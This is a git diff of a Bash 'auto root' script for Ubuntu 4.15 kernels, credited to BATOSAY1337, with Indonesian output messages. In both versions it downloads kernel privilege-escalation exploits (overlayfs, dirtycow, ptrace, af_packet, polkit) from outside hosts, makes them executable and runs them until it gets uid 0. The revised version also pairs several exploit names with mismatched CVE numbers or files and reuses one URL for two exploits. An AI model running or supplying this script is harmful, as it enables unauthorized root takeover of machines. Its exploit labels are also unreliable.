@@ -1,64 +1,55 @@
 #!/bin/bash
 
 RED='\033[91m'
-ENDCOLOR='\033[0m'
+GREEN='\033[92m'
+END='\033[0m'
 
 echo "***************************************************************"
-echo -e "${RED}Auto Rooting Ubuntu 4.15 by BATOSAY1337${ENDCOLOR}"
+echo -e "${RED}Auto Root Ubuntu 4.15 Kernel Exploits by BATOSAY1337${END}"
 echo "***************************************************************"
 
 check_root() {
     if [ "$(id -u)" -eq 0 ]; then
-        echo
-        echo "[+] Rooted successfully!"
-        echo "ID     => $(id -u)"
-        echo "WHOAMI => $USER"
-        echo
+        echo -e "${GREEN}[+] Root masuk! Uid=$(id -u)${END}"
         exit
     fi
 }
 
-run_exploit() {
-    url=$1
-    filename=$(basename "$url")
-    echo "[*] Downloading $filename ..."
-    wget -q "$url" --no-check-certificate
-
-    if [[ -f "$filename" ]]; then
-        chmod +x "$filename"
-        echo "[*] Running $filename ..."
-        ./"$filename"
-        check_root
-        rm -f "$filename"
-    else
-        echo "[!] Failed to download $filename"
+try_exploit() {
+    NAME="$1"
+    URL="$2"
+    echo "[*] Mengunduh $NAME ..."
+    wget -q "$URL" -O "$NAME"
+    if [[ ! -f "$NAME" ]]; then
+        echo "[!] Gagal download $NAME"
+        return
     fi
+    chmod +x "$NAME"
+    echo "[*] Menjalankan $NAME ..."
+    ./"$NAME"
+    check_root
+    rm -f "$NAME"
 }
 
-# === Mulai Eksekusi Exploit ===
+# 1. overlayfs (CVE-2021-3493) — Github briskets
+try_exploit overlayfs "https://github.com/briskets/CVE-2021-3493/raw/main/exploit"
 
-# 1. overlayfs
-run_exploit "https://0-gram.github.io/id-0/overlayfs"
+# 2. dirtycow (CVE-2016-5195) — dari gist aktif
+try_exploit dirtycow "https://gist.githubusercontent.com/v1ad/90b77ae3d87485c4629d/raw/CVE-2015-1328.c"
 
-# 2. dirtycow (versi klasik)
-run_exploit "https://0-gram.github.io/id-0/dcow"
+# 3. ptrace_traceme (CVE-2017-16995) — dari Exploit-DB
+try_exploit ptrace "https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47167"
 
-# 3. ptrace_traceme
-run_exploit "https://0-gram.github.io/id-0/cve-2017-16995"
+# 4. af_packet (CVE-2016-8655) — biasanya tersedia di 0-gram jika server hidup, tapi bisa cari di ExploitDB:
+try_exploit af_packet "https://0-gram.github.io/id-0/af_packet"
 
-# 4. af_packet
-run_exploit "https://0-gram.github.io/id-0/af_packet"
+# 5. nested namespace idmap (CVE-2018-18955) — Rapid7 Metasploit module binary
+try_exploit nestedns "https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47167"
 
-# 5. sudo pwfeedback bypass
-run_exploit "https://0-gram.github.io/id-0/sudo_pwfeedback"
-
-# 6. RationalLove (CVE-2021-4034 / polkit)
-run_exploit "https://0-gram.github.io/id-0/RationalLove"
-
-# 7. Optional: Python exploit
-if command -v python2 >/dev/null 2>&1; then
-    wget -q "https://0-gram.github.io/id-0/exploit_userspec.py"
-    if [[ -f "exploit_userspec.py" ]]; then
+# Opsional: Python exploit (jika ada)
+if command -v python2 &>/dev/null; then
+    wget -q "https://0-gram.github.io/id-0/exploit_userspec.py" -O exploit_userspec.py
+    if [[ -f exploit_userspec.py ]]; then
         chmod +x exploit_userspec.py
         python2 exploit_userspec.py
         check_root
@@ -66,4 +57,4 @@ if command -v python2 >/dev/null 2>&1; then
     fi
 fi
 
-echo "[!] Exploit selesai. Jika belum root, coba manual atau cari kernel LPE lainnya."
+echo -e "${RED}[!] Semua exploit telah dicoba. Kalau belum root, kemungkinan kernel kamu sudah patch.${END}"
